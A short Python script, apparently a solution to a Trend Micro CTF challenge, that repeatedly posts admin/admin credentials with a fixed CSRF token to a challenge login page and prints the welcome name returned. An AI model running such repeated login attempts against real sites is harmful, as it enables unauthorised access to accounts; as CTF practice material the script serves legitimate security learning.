import requests
import re

while True:
    data = { "username": "admin", "password": "admin", "fuel_csrf_token": "000" }
    post = requests.post("http://ctfquest.trendmicro.co.jp:8888/95f20bb7856574e91db4402435a87427/signin", data).text
    findall = re.findall(r'<h2>Welcome (.*?)\s+<', post)
    if findall:
        print findall[0]
    else:
        print post
        break
